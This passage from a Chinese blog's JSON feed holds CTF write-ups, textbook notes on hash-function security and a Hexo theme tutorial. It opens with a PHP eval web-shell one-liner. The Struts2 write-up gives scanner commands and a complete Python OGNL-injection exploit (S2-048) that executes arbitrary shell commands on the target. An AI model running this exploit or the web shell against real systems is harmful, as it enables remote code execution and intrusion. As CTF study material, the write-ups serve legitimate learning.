Shell): &lt;?php eval($_POST[1]);?&gt;\n</code></pre>\n<p>访问<code>shell.php</code>，然后正常rce</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7f1ae6d2/",
            "url": "http://dpm12345.cn/posts/7f1ae6d2/",
            "title": "java",
            "date_published": "2023-03-16T14:12:40.000Z",
            "content_html": "<h1 id=\"web-279-294-296-297\"><a href=\"#web-279-294-296-297\" class=\"headerlink\" title=\"web 279-294 296-297\"></a>web 279-294 296-297</h1><p>脚本通杀 下载 下载链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0hhdEJveS9TdHJ1dHMyLVNjYW4=\">https://github.com/HatBoy/Struts2-Scan</span><br>具体用法在md文件中，例如<br>检测<br><code>python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action</code><br>利用<br><code>python Struts2Scan.py -u http://94c4c47e-4fb3-408c-97d7-56a5094f84a7.chall.ctf.show/S2-001/login.action -n S2-001 --exec</code><br>执行命令env即可得到flag</p>\n<h1 id=\"web-295\"><a href=\"#web-295\" class=\"headerlink\" title=\"web 295\"></a>web 295</h1><p>漏洞点在：<span class=\"exturl\" data-url=\"aHR0cDovLzg0NmNlMzM0LTU5ZDAtNGRjMS1iNzhkLTE5NDA4OWFjM2JlOS5jaGFsbGVuZ2UuY3RmLnNob3cvUzItMDQ4L2ludGVncmF0aW9uL3NhdmVHYW5nc3Rlci5hY3Rpb24=\">http://846ce334-59d0-4dc1-b78d-194089ac3be9.challenge.ctf.show/S2-048/integration/saveGangster.action</span></p>\n<pre><code class=\"python\">import json,re\nimport requests\nimport threading\nimport urllib.parse\nimport base64\n\ndef Poc(url,command):\n    header = {'Content-Type': 'application/x-www-form-urlencoded'}\n    poc = {\"name\":\"%{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' \\\n                          \"+command+\"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}\",\"age\":\"1\",\"__checkbox_bustedBefore\":\"true\",\"description\":\"123123\"}\n    data = urllib.parse.urlencode(poc)\n    try:\n        result = requests.post(url,data=data,headers=header)\n        if result.status_code == 200:\n            \n            print(result.content)\n    except requests.ConnectionError as e:\n        print(e)\n\nth = {\"url\":\"\"}\n\nwhile True:\n    if th.get(\"url\") != \"\":\n        input_cmd = input(\"cmd &gt;&gt;: \")\n        if input_cmd == \"exit\":\n            exit()\n        elif input_cmd == 'set':\n            url = input(\"set url :\")\n            th['url'] = url\n        elif input_cmd == 'show url':\n            print(th.get(\"url\"))\n        else:\n            Poc(th.get(\"url\"),input_cmd)\n    else:\n        url = input(\"set url :\")\n        th[\"url\"] = url\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/7821492f/",
            "url": "http://dpm12345.cn/posts/7821492f/",
            "title": "第四章 Hash函数",
            "date_published": "2023-01-24T00:20:29.000Z",
            "content_html": "<p><strong>定义4.1</strong> 一个Hash族是满足下列条件的四元组$(\\mathcal{X},\\mathcal{Y},\\mathcal{K},\\mathcal{H})$</p>\n<ol>\n<li>$\\mathcal{X}$是所有消息的集合</li>\n<li>$\\mathcal{Y}$是由所有消息摘要或认证标签组成的有限集</li>\n<li>$\\mathcal{K}$是密钥空间，是所有密钥的的有限集</li>\n<li>对于每个$K\\in\\mathcal{K}$，存在一个Hash函数 $h_k\\in\\mathcal {H},\\ h_k:{\\mathcal {X}}\\rightarrow\\mathcal {Y}$</li>\n</ol>\n<h1 id=\"Hash函数的安全性\"><a href=\"#Hash函数的安全性\" class=\"headerlink\" title=\"Hash函数的安全性\"></a>Hash函数的安全性</h1><p>三个问题</p>\n<p>:::primary no-icon</p>\n<p><strong>问题4.1</strong>  原像</p>\n<p><strong>条件：</strong>  Hash函数 $h:\\mathcal{X}\\rightarrow\\mathcal{Y}$ 和 $y\\in \\mathcal {Y}$</p>\n<p><strong>找出：</strong>  $x\\in\\mathcal{X}$ 使得 $h(x)=y$</p>\n<p>给定一个(可能)的消息摘要y，原像问题是问是否可找到x使得 $h(x)=y$。如果对某个给定的$y\\in\\mathcal{Y}$，原像问题能够解决(即找到x)，则$(x,y)$是有效的。不能有效解决原像问题的Hash函数通常称为单项(one-way)的或者原像稳固的(preimage resistant)的</p>\n<p>:::</p>\n<p>:::primary no-icon</p>\n<p><strong>问题4.2</strong>  第二原像</p>\n<p><strong>条件：</strong>  Hash函数 $h:\\mathcal{X}\\rightarrow\\mathcal{Y}$ 和 $x\\in\\mathcal{X}$</p>\n<p><strong>找出：</strong>  $x^{‘}\\in\\mathcal{X}$ 使得 $x^{‘}\\not=x$，并且 $h(x^{‘})=h(x)$</p>\n<p>给定一个消息$x$，第二原像问题问是否能找到 $x^{‘}\\not=x$，使得 $h(x^{‘})=h(x)$。要注意的是，如果问题能够得到解决，则 $(x^{‘},h(x))$ 是有效的二元组。不能有效解决第二原像问题(即找不到$x^{‘}$Hash函数通常称为第二原像稳固(second preimage resistant)</p>\n<p>:::</p>\n<p>:::primary no-icon</p>\n<p><strong>问题4.3</strong>  碰撞</p>\n<p><strong>条件：</strong>  Hash函数 $h:\\mathcal{X}\\rightarrow\\mathcal{Y}$ </p>\n<p><strong>找出：</strong>  $x,x^{‘}\\in\\mathcal{X}$ 使得 $x^{‘}\\not=x$，并且 $h(x^{‘})=h(x)$</p>\n<p>碰撞问题是问是否可以找到 $x^{‘}\\not=x$，使得 $h(x^{‘})=h(x)$。对这个问题的解答并不能直接产生有效的二元组。可是，如果 $(x,y)$ 是有效的的二元组，并且 $x,x^{‘}$ 是碰撞问题的解，则 $(x^{‘},x)$ 也是一个有效的二元组。已有各种各样的方案来避免这种情况的出现。不能有效解决碰撞问题(即找不到)的Hash函数同城成为碰撞稳固。</p>\n<p>:::</p>\n<h2 id=\"随机预言模型\"><a href=\"#随机预言模型\" class=\"headerlink\" title=\"随机预言模型\"></a>随机预言模型</h2><p>“理想的”Hash函数：对于该Hash函数 $h$,对于给定的 $x$，求出函数 $h$ 在点 $x$ 的值是得到 $h(x)$的唯一方法，即只能通过函数计算得出</p>\n<p>+++info 这里给出不满足该性质的一个例子</p>\n<p>假定Hash函数 $h:\\mathbb{Z}_n\\times\\mathbb{Z}_n\\rightarrow\\mathbb{Z}_n$ 是一个线性函数，令<br>$$<br>h(x,y)=ax+by\\quad mod\\quad n<br>$$<br>$a,b\\in\\mathbb{Z}_n$ 且 $n\\ge2$ 是正整数。假定已经得到<br>$$<br>h(x_1,y_1)=z_1\\newline<br>h(x_2,y_2)=z_2<br>$$<br>令$r,s\\in\\mathbb{Z}_n$;则有<br>$$<br>\\begin{eqnarray*}<br>h(rx_1+sx_2\\ mod\\ n,ry_1+sy_2\\ mod\\ n)&amp;=&amp; a(rx_1+sx_2) + b(ry_1+sy_2)\\quad mod \\quad n\\newline<br>                                      &amp;=&amp; r(ax_1+by_1) + s(ax_2+by_2)\\quad mod \\quad n\\newline<br>                                      &amp;=&amp; rh(x_1,y_1) + sh(x_2,y_2)\\quad mod \\quad n<br>\\end{eqnarray*}<br>$$<br>也就是说，当知道函数 $h(x_1,y_1),h(x_2,y_2)$ 的值后，对其他点的值无需通过函数 $h$ 进行，而是可以由已知值得出</p>\n<p>+++</p>\n<p>:::success</p>\n<p><strong>定理 4.1</strong>  假定 $h\\in\\mathcal{F}^{\\mathcal{X},\\mathcal{Y}}$ 是随机选择的，令$\\mathcal{X}_0\\in\\mathcal{X}$。假定当且仅当 $x\\in\\mathcal{X}_0$ 时，$h(x)$ (通过查询 $h$ 的预言器)被确定。则对所有的 $x\\in\\mathcal{X}\\setminus\\mathcal{X}_0$ 和 有 $y\\in\\mathcal{Y}$，有 $\\mathbf{Pr}[h(x)=y]=1/\\mathbf{M}$</p>\n<p>( $y$ 的总个数为 $M$，而 $(x,y)$ 是一一对应，故概率为 $1/M$ )</p>\n<p>:::</p>\n<h2 id=\"随机语言模型中的算法\"><a href=\"#随机语言模型中的算法\" class=\"headerlink\" title=\"随机语言模型中的算法\"></a>随机语言模型中的算法</h2><p>$(\\epsilon,q)$-算法来表示一个具有平均情况成功率为 $\\epsilon$ 的 Las Vegas 算法，该算法向预言器查询(即求 $h$ 的值)的次数最多为 $q$ 。如果 $x$ 或者 $y$ 被确定作为问题实例的一部分，那么成功率 $\\epsilon$ 就是对所有 $h\\in\\mathcal{F^{\\mathcal{X},\\mathcal{Y}}}$，以及所有 $x\\in\\mathcal{X}$ 或 $y\\in\\mathcal{Y}$ 的可能出现的随机选择的平均值</p>\n<p><strong>通过计算 $q$ 个点的 $h$ 值来解决原像问题的算法</strong></p>\n<p>:::info no-icon</p>\n<p><strong>算法 4.1  $FindPreimage(h,y,q)$</strong></p>\n<p>选择任意的 $\\mathcal{X}_0\\subseteq\\mathcal{X}$, $|\\mathcal{X}_0|=q$</p>\n<p>$for \\quad each \\quad x\\in\\mathcal{X}_0$</p>\n<p>​\t$do\\begin{cases}if :&amp;h(x_0)=y\\&amp;then\\quad return(x)\\end{cases}$</p>\n<p>$return(failure)$</p>\n<p>:::</p>\n<p>:::success</p>\n<p><strong>定理 4.2  对任意的 $\\mathcal{X}_0\\subseteq\\mathcal{X}$,且 $|\\mathcal{X}_0|=q$，算法 4.1 中平均情况成功率为 $\\epsilon=1-(1-1/M)^q$</strong></p>\n<p>+++info 证明</p>\n<p>给定 $y\\in\\mathcal{Y}$，令 $\\mathcal{X}_0={x_1,\\dots,x_q}$。对于 $1\\le i\\le q$，令 $E_i$ 表示事件“$h(x_i)=y$”。由定理 4.1 可知，$E_i$ 是独立事件，并且对所有的 $1\\le i \\le q$，$\\mathbf{Pr}[E_i]=1/M$。因此，下面的等式成立：<br>$$<br>\\mathbf{Pr}[E_1 \\or E_2 \\or \\cdots \\or E_q]=1-(1-\\frac{1}{M})^q<br>$$<br>(对于一个 $E_i$ ,其成功概率为 $1/M$，若要求平均情况成功率，即求至少一个 $E_i$ 成立，那么所有都不成立的概率为 $(1-\\frac{1}{M})^q$，故最后所求平均情况成功率为 $1-(1-\\frac{1}{M})^q$ )</p>\n<p>对任何选定的 $y$，算法 4.1 的成功率都是常数。因此，所有 $y\\in\\mathcal{Y}$ 的成功率也是相同的。</p>\n<p>注意，$q$ 远小于 $M$，所以上面的成功率大约是 $q/M$</p>\n<p>+++</p>\n<p>:::</p>\n<p><strong>下面是一个企图解决第二原像问题的算法</strong></p>\n<p>:::info no-icon</p>\n<p><strong>算法 4.2 $FindSecondPreimage(h,x,q)</strong></p>\n<p>$y\\leftarrow h(x)$</p>\n<p>选择 $\\mathcal{X}_0\\subseteq\\mathcal{X}\\setminus{x},\\ |\\mathcal{X}_0|=q-1$</p>\n<p>$for \\quad each \\quad x_0\\in\\mathcal{X}_0$</p>\n<p>​\t$do\\begin{cases}if :&amp;h(x_0)=y\\&amp;then\\quad return(x_0)\\end{cases}$</p>\n<p>$return(failure)$</p>\n<p>:::</p>\n<p>对算法 4.2 的分析与以前的算法分析类似。唯一不同之处是额外使用 $h$，来对输入值 $x$ 计算 $y=h(x)$。</p>\n<p>:::success</p>\n<p><strong>定理 4.3</strong>  对任意的 $\\mathcal{X}_0\\subseteq\\mathcal{X}\\setminus{x}$，且 $|\\mathcal{X}_0|=q-1$，算法 4.2 中的成功率为 $\\epsilon=1-(1/M)^{q-1}$</p>\n<p>:::</p>\n<p><strong>下面是针对碰撞问题的基本算法</strong></p>\n<p>:::info no-icon</p>\n<p><strong>算法 4.3  $FindCollision(h,q)$</strong></p>\n<p>选择任意的 $\\mathcal{X}_0\\subseteq\\mathcal{X}$,$|\\mathcal{X}_0|=q$</p>\n<p>$for \\quad each \\quad x\\in\\mathcal{X}_0$</p>\n<p>​\t$do \\quad y_x \\leftarrow h(x)$</p>\n<p>$if$ 对某一 $x^{‘}\\not=x$，有 $y_x=y_{x^{‘}}$</p>\n<p>​\t$then \\quad return(x,x^{‘})$</p>\n<p>$else \\quad return(failure)$ </p>\n<p>:::</p>\n<p>在算法 4.3 中，对某一 $x^{‘}\\not= x$，可以有效地检验是否有 $y_x = y_{x^{‘}}$，例如，可以对 $y_x$进行排序。这个算法可以利用类似于的”生日悖论”的概率来分析</p>\n<p>:::success</p>\n<p><strong>定理 4.4</strong>  对任意 $\\mathcal{X}_0\\subset\\mathcal{X}$，且 $|\\mathcal{X}_0|=q$，算法 4.3 的成功率为<br>$$<br>\\epsilon=1-(\\frac{M-1}{M})(\\frac{M-2}{M})\\cdots(\\frac{M-q+1}{M})<br>$$<br>+++info 证明</p>\n<p>令 $\\mathcal{X}<em>0={x_1,\\cdots,x_q}$。对于 $1\\le i \\le q$，令 $E_i$ 表示事件：<br>$$<br>h(x_i)\\notin{h(x_1),\\dots,h(x</em>{i-1})}<br>$$<br>利用归纳法，由定理 4.1 可知 $\\mathbf{Pr}[E_i]=1$，并且对于 $2 \\le i \\le q$，有：<br>$$<br>\\mathbf{Pr}[E_i|E_1 \\and E_2 \\and \\cdots \\and E_{i-1}]=\\frac{M-i+1}{M}<br>$$<br>由此可得：<br>$$<br>\\mathbf{Pr}[E_1 \\and E_2 \\and \\cdots \\and E_q]=(\\frac{M-1}{M})(\\frac{M-2}{M})\\cdots(\\frac{M-q+1}{M})<br>$$<br>至此定理成立。</p>\n<p>+++</p>\n<p>:::</p>\n<p>上面的定理说明了无碰撞的概率是：<br>$$<br>(\\frac{M-1}{M})(\\frac{M-2}{M})\\cdots(\\frac{M-q+1}{M})=\\prod^{q-1}_{i=1}\\left(1-\\frac{i}{M}\\right)<br>$$<br>如果 $x$ 是一个小实数，则 $1-x\\approx e^{-x}$。</p>\n<p>则无碰撞的概率大约是：<br>$$<br>\\begin{aligned}<br>\\prod^{q-1}<em>{i=1}\\left(1-\\frac{i}{M}\\right)&amp;\\approx\\prod^{q-1}</em>{i=1}e^{\\frac{-i}{M}}\\<br>                                           &amp;=e^{-\\sum^{q-1}_{i=1}\\frac{i}{M}}\\<br>                                           &amp;=e^{\\frac{-q(q-1)}{2M}}<br>\\end{aligned}<br>$$<br>因此，可以估计产生至少一个碰撞的概率为：<br>$$<br>1-e^{\\frac{-q(q-1)}{2M}}<br>$$<br>如果把这个概率表示为 $\\epsilon$，则可以把 $q$ 作为 $M$ 和 $\\epsilon$ 的函数：<br>$$<br>\\begin{aligned}<br>e^{\\frac{-q(q-1)}{2M}}&amp;\\approx 1-\\epsilon\\<br>\\frac{-q(q-1)}{2M}&amp;\\approx ln(1-\\epsilon)\\<br>q^2-q&amp;\\approx2Mln\\left(\\frac{1}{1-\\epsilon}\\right)<br>\\end{aligned}<br>$$<br>如果忽略 $-q$ 项，则可以估计出：<br>$$<br>q\\approx\\sqrt{2Mln\\left(\\frac{1}{1-\\epsilon}\\right)}<br>$$<br>如果取 $\\epsilon=0.5$，那么<br>$$<br>q\\approx1.17\\sqrt{M}<br>$$<br>这就说明了在 $\\mathcal{X}$ 中对超过 $\\sqrt{M}$ 个随机元素计算出的 Hash 函数值里面有 50% 的概率出现一个碰撞。注意，对 $\\epsilon$ 不同的选择会导致不同的常数因子，但 $q$ 总是与 $\\sqrt{M}$ 成一定的比例。这是一个$(1/2,O(\\sqrt{M}))$-算法</p>\n<p>所以，对于40比特的消息摘要，那么在 $2^{20}$(约一百万)个随机 Hash 值中就有 50% 的概率发现一个碰撞，128比特，那么即需要 $2^{64}$ 个 Hash值</p>\n<h3 id=\"安全标准的比较\"><a href=\"#安全标准的比较\" class=\"headerlink\" title=\"安全标准的比较\"></a>安全标准的比较</h3><p>利用下面算法 4.4 可以相当容易地把碰撞问题变为第二原像问题</p>\n<p>:::info no-icon</p>\n<p><strong>算法 4.4</strong>  $CollisionToSecondPreimage(h)$</p>\n<p>$external\\quad Oracle2ndPreimage$</p>\n<p>均匀地随机选择 $x\\in\\mathcal{X}$</p>\n<p>$if\\ (Oracle2ndPreimage(h,x)=x^{‘})$</p>\n<p>​\t$then\\quad return(x,x^{‘})$</p>\n<p>$else\\quad return(failure)$</p>\n<p>:::</p>\n<p>假定<code>Oracle2ndPreimage</code>是对一个特定的 Hash 函数解决了第二原像问题的 $(\\epsilon,q)$-算法．显然<code>CollisionToSecondPreimage</code>就是对同样的 Hash 函数 $h$ 解决了碰撞问题的  $(\\epsilon,q+2)$-算法，这个转化并不要求对 Hash 函数 $h$ 做任何假定。作为这个转化的结果,可以说碰撞稳固性质意味着第二原像稳固性质。</p>\n<p>下面将研究更有趣的问题:是否碰撞问题可以转化为原像问题。也就是说，是否碰撞稳固意味着原像稳固？我们将证明至少在一些特殊情况下，这是对的。更明确的是,我们将证明任何能解决原像问题且概率为 1 的算法也能够解决碰撞问题。</p>\n<p>这个转化仅仅要求对 Hash 函数的定义域和值域做相当弱的假定就能够完成。设 Hash 函数 $h:\\mathcal{X}\\rightarrow\\mathcal{Y}$，其中 $\\mathcal{X}$ 和 $\\mathcal{Y}$ 都是有限集,并且 $|x| \\ge 2|y|$。假定<code>OraclePreimage</code>对原像问题是一个$(1 ,q)$-算法。<code>OraclePreimage</code>作为输入接收一个消息摘要 $y\\in\\mathcal{Y}$，并且总可以发现一个元素 $OraclePreimage(y)\\in x$ ,使得 $h(OraclePreimage(y))=y$(这意味着 $h$ 是满射)。我们将分析算法 4.5 描述的 $CollisionToPreimage$ 算法。</p>\n<p>:::info no-icon</p>\n<p><strong>算法 4.5</strong>  $CollisionToPreimage(h)$</p>\n<p>$external\\quad OraclePreimage$</p>\n<p>均匀地随机选择 $x\\in\\mathcal{X}$</p>\n<p>$y\\leftarrow h(x)$</p>\n<p>$if\\ (OraclePreimage(h,y)=x^{‘})$ 且 $(x\\not=x^{‘})$</p>\n<p>​\t$then\\quad return(x,x^{‘})$</p>\n<p>$else\\quad return(failure)$</p>\n<p>:::</p>\n<p>:::success</p>\n<p><strong>定理 4.5</strong>  假定 $h:\\mathcal{X}\\rightarrow\\mathcal{Y}$ 是一个 Hash 函数，$|\\mathcal{X}|$ 和 $|\\mathcal{Y}|$ 是有限的,并且$|\\mathcal{X}|\\ge2|\\mathcal{Y}|$ 。假定<code>OrauclePreirmage</code>对固定的 Hash 函数 $h$ 是原像问题的一个 $(1,q)$-算法。则 <code>CollisioriToPreimage</code>对固定的 Hash 函数 $h$ 是碰撞问题的一个 $(1/2 , q+1)$-算法。</p>\n<p>+++info 证明</p>\n<p>显然<code>CollisionToPreimague</code>是一个 Las Vegas 类型的概率算法，因为它或者发现一个碰撞，或者返回“失败”。这样，我们的主要任务是计算平均成功率。对任意 $x\\in\\mathcal{X}$，如果 $h(x)=h(x_1)$，定义 $(x\\sim x_1)$。容易看出“~”是一个等价关系。定义;<br>$$<br>[x]={x_1\\in\\mathcal{X}:x\\sim x_1 }<br>$$<br>每个等价类 $[x]$ 由 $\\mathcal{Y}$ 中某个元的逆像组成。所以等价类的个数等于 $\\mathcal{Y}$。用 $\\mathcal{C}$ 表示等价类的集合。</p>\n<p>现在,设 $x$ 是由算法 $CollisionToPreimage$ 中选出的 $\\mathcal{X}$ 中的随机数。对于这个 $x$，有 $|\\ [\\ x\\ ]\\ |-1$种可能的 $x_1$ 可以作为<code>OraclePreirmage</code>的输出被返回。有 $|\\ [\\ x\\ ]\\ |-1$/ 个 $\\x_1$与 $x$ 不同，因此可产生碰撞(注意,算法<code>OraclePreimage</code>并不知道由算法<code>CollisionToPreimage</code>初始选择的等价类 $[\\ x\\ ]$的代表元)。所以，给定元素 $x\\in\\mathcal{X}$，成功率为 $(|\\ [\\ x\\ ]\\ |-1)/|\\ [\\ x\\ ]\\ |$</p>\n<p>算法<code>CollisionToPreimage</code>的成功率是通过对所有可能选择的 $x$ 做平均计算得到：<br>$$<br>\\begin{aligned}<br>\\mathbf{Pr}&amp;=\\frac{1}{|\\mathcal{X}|}\\sum_{x\\in\\mathcal{X}}\\frac{|[x]|-1}{|[x]|}\\<br>           &amp;=\\frac{1}{|\\mathcal{X}|}\\sum_{c\\in\\mathcal{C}}\\sum_{x\\in\\mathcal{C}}\\frac{|C|-1}{|C|}\\<br>           &amp;=\\frac{1}{|\\mathcal{X}|}\\left(\\sum_{c\\in\\mathcal{C}}|C|-\\sum_{C\\in\\mathcal{C}}1\\right)\\<br>           &amp;=\\frac{|\\mathcal{X}|-|\\mathcal{Y}|}{|\\mathcal{X}|}\\<br>           &amp;\\ge\\frac{|\\mathcal{X}|-|\\mathcal{X}|/2}{|\\mathcal{X}|}\\<br>           &amp;=\\frac{1}{2}<br>\\end{aligned}<br>$$<br>因此，我们构造了一个平均情况成功率至少为 1/2 的 Las Vegas 算法</p>\n",
            "tags": [
                "cryptography"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/f5c52549/",
            "url": "http://dpm12345.cn/posts/f5c52549/",
            "title": "shoka主题添加文章统计",
            "date_published": "2023-01-20T15:50:11.000Z",
            "content_html": "<p>参考自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGF2ZW5kZXJkaC5jbi8=\">Lavender</span>的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGF2ZW5kZXJkaC5jbi9wb3N0cy8zMjY1MTczNzAxLw==\">Shoka主题：新增文章统计页面</span></p>\n<h1 id=\"添加统计页面\"><a href=\"#添加统计页面\" class=\"headerlink\" title=\"添加统计页面\"></a>添加统计页面</h1><ol>\n<li><p>安装 <code>cheerio</code>，控制台执行 </p>\n<pre><code class=\"raw\">npm i cheerio --save`\n</code></pre>\n</li>\n<li><p>新建统计页面</p>\n<pre><code class=\"raw\">hexo new page statistics\n</code></pre>\n</li>\n</ol>\n<p>可以看到<code>source</code>目录下(如果没改)多了一个<code>statistics</code>文件夹，其中有一个<code>index.md</code>文件，进入后，可以修改<code>title</code>项，即改变该页面的标题显示文字</p>\n<p>之后复制以下内容，作为页面内容(开头和结尾的<code>\\</code>均需删掉)</p>\n<pre><code class=\"markdownk.o;\"> {% raw %} {% endraw %}\n&lt;script src=\"https://cdn.jsdelivr.net/npm/echarts@5.2.2/dist/echarts.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\nfunction switchPostChart () {\n  // 这里为了统一颜色选取的是 “明暗模式” 下的两种字体颜色，也可以自己定义\n  let color = document.documentElement.getAttribute('data-theme') === 'dark' ? '#333' : '#ccc'\n  let darkmode = color === \"#ccc\" ? true : false\n  if (document.getElementById('posts-calendar')) {\n    let postsCalendarNew = postsCalendarOption\n    postsCalendarNew.darkMode = darkmode\n    postsCalendarNew.textStyle.color = color\n    postsCalendarNew.title.textStyle.color = color\n    postsCalendarNew.visualMap.textStyle.color = color\n    for (var i = 0; i &lt; postsCalendarNew.calendar.length; i++) {\n      postsCalendarNew.calendar[i].yearLabel.color = color\n      postsCalendarNew.calendar[i].monthLabel.color = color\n      postsCalendarNew.calendar[i].dayLabel.color = color\n    }\n    postsCalendar.setOption(postsCalendarNew)\n  }\n  if (document.getElementById('posts-chart')) {\n    let postsOptionNew = postsOption\n    postsOptionNew.darkMode = darkmode\n    postsOptionNew.textStyle.color = color\n    postsOptionNew.title.textStyle.color = color\n    postsOptionNew.xAxis.axisLine.lineStyle.color = color\n    postsOptionNew.yAxis.axisLine.lineStyle.color = color\n    postsChart.setOption(postsOptionNew)\n  }\n  if (document.getElementById('tags-chart')) {\n    let tagsOptionNew = tagsOption\n    tagsOptionNew.darkMode = darkmode\n    tagsOptionNew.textStyle.color = color\n    tagsOptionNew.title.textStyle.color = color\n    tagsOptionNew.xAxis.axisLine.lineStyle.color = color\n    tagsOptionNew.yAxis.axisLine.lineStyle.color = color\n    tagsChart.setOption(tagsOptionNew)\n  }\n  if (document.getElementById('categories-chart')) {\n    let categoriesOptionNew = categoriesOption\n    categoriesOptionNew.darkMode = darkmode\n    categoriesOptionNew.textStyle.color = color\n    categoriesOptionNew.title.textStyle.color = color\n    categoriesOptionNew.legend.textStyle.color = color\n    categoriesChart.setOption(categoriesOptionNew)\n  }\n}\n\ndocument.getElementsByClassName(\"theme\")[0].addEventListener(\"click\", function () { setTimeout(switchPostChart, 100) })\n&lt;/script&gt;\n&lt;!-- 文章发布日历 --&gt;\n&lt;div id=\"posts-calendar\" style=\"border-radius: 8px; height: 300px; padding: 10px;\"&gt;&lt;/div&gt;\n&lt;!-- 文章发布时间统计图 --&gt;\n&lt;div id=\"posts-chart\" style=\"border-radius: 8px; height: 300px; padding: 10px;\"&gt;&lt;/div&gt;\n&lt;!-- 文章标签统计图 --&gt;\n&lt;div id=\"tags-chart\" data-length=\"10\" style=\"border-radius: 8px; height: 300px; padding: 10px;\"&gt;&lt;/div&gt;\n&lt;!-- 文章分类统计图 --&gt;\n&lt;div id=\"categories-chart\"  style=\"border-radius: 8px; height: 300px; padding: 10px;\"&gt;&lt;/div&gt;\n{% raw %} {% endraw %} \n</code></pre>\n<h1 id=\"修改对应配置\"><a href=\"#修改对应配置\" class=\"headerlink\" title=\"修改对应配置\"></a>修改对应配置</h1><ol start=\"3\">\n<li>然后找到<code>themes/shoka/languages</code>文件夹，找到对应的使用语言的<code>yml</code>文件，在这里，我使用的是<code>zh-CN.yml</code></li>\n</ol>\n<p>找到<code>menu</code>项</p>\n<p>原内容</p>\n<pre><code class=\"raw\">menu:\n  home: 首页\n  posts: 文章\n  archives: 归档\n  categories: 分类\n  tags: 标签\n  about: 关于\n  search: 搜索\n</code></pre>\n<p>修改后</p>\n<pre><code class=\"raw\">menu:\n  home: 首页\n  posts: 文章\n  archives: 归档\n  categories: 分类\n  tags: 标签\n  about: 关于\n  search: 搜索\n  statistics: 统计\n</code></pre>\n<p>其中<code>统计</code>为页面导航栏显示的文字</p>\n<ol start=\"4\">\n<li>设置路径</li>\n</ol>\n<p>找到主题配置文件<code>_config.shoka.yml</code>下的<code>menu</code>栏,添加</p>\n<pre><code class=\"raw\">statistics: /statistics/ || shuzhuangtu\n</code></pre>\n<p>其中<code>/statistic/</code>为该页面文件在网站目录的路径</p>\n<p><code>shuzhuangtu</code>为使用的<code>iconfont</code>，具体添加方法参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaG9rYS5sb3N0eXUubWUvY29tcHV0ZXItc2NpZW5jZS9ub3RlL3RoZW1lLXNob2thLWRvYy9jb25maWcvI2ljb25mb250JUU1JTlCJUJFJUU2JUEwJTg3\">shoka主题基本配置</span></p>\n<h1 id=\"添加代码\"><a href=\"#添加代码\" class=\"headerlink\" title=\"添加代码\"></a>添加代码</h1><ol start=\"5\">\n<li>添加文章统计代码</li>\n</ol>\n<p>找到<code>themes\\shoka\\scripts\\helpers</code>，新建<code>charts.js</code>文件，输入以下内容</p>\n<pre><code class=\"javascript\">'use strict';\n\nconst cheerio = require('cheerio')\nconst moment = require('moment')\n\nhexo.extend.filter.register('after_render:html', function (locals) {\n  const $ = cheerio.load(locals)\n  const calendar = $('#posts-calendar')\n  const post = $('#posts-chart')\n  const tag = $('#tags-chart')\n  const category = $('#categories-chart')\n  let htmlEncode = false\n  var dateMap = new Map();\n  hexo.locals.get('posts').forEach(function (post) {\n    var date = post.date.format('YYYY-MM-DD')\n    var count = dateMap.get(date);\n    dateMap.set(date, count == null || count == undefined ? 1 : count + 1);\n  });\n  // calculate range.\n  const start_date = getMinDate(Array.from(dateMap.keys())).startOf('year')\n  const end_date = moment();\n  const start_year = start_date.year()\n  const end_year = end_date.year()\n\n  if (calendar.length &gt; 0 || post.length &gt; 0 || tag.length &gt; 0 || category.length &gt; 0) {\n    if (calendar.length &gt; 0 &amp;&amp; $('#postsCalendar').length === 0) {\n      if (calendar.attr('data-encode') === 'true') htmlEncode = true\n      calendar.attr('style', function (i, content) {\n        return content.replace(\"height:300px\", \"height:\" + (300 + (end_year - start_year) * 150) + \"px\")\n      })\n      calendar.after(postsCalendar())\n    }\n    if (post.length &gt; 0 &amp;&amp; $('#postsChart').length === 0) {\n      if (post.attr('data-encode') === 'true') htmlEncode = true\n      post.after(postsChart())\n    }\n    if (tag.length &gt; 0 &amp;&amp; $('#tagsChart').length === 0) {\n      if (tag.attr('data-encode') === 'true') htmlEncode = true\n      tag.after(tagsChart(tag.attr('data-length')))\n    }\n    if (category.length &gt; 0 &amp;&amp; $('#categoriesChart').length === 0) {\n      if (category.attr('data-encode') === 'true') htmlEncode = true\n      category.after(categoriesChart())\n    }\n\n    if (htmlEncode) {\n      return $.root().html().replace(/&amp;amp;#/g, '&amp;#')\n    } else {\n      return $.root().html()\n    }\n  } else {\n    return locals\n  }\n}, 15)\n\nfunction getMinDate(dateList) {\n  var dates = []\n  for (var i = 0; i &lt; dateList.length; i++) {\n    dates[i] = moment(dateList[i], 'YYYY-MM-DD')\n  }\n  var minDate = moment.min(dates)\n  return minDate\n}\n\nfunction getCalendar(start, end, end_date) {\n  var res = '['\n  for (var year = start; year &lt;= end; year += 1) {\n    var range\n    if (year &lt; end) {\n      range = \"'\" + year + \"'\"\n    }\n    else {\n      range = \"['\" + moment().year(year).startOf('year').format('YYYY-MM-DD') + \"','\" + end_date.format('YYYY-MM-DD') + 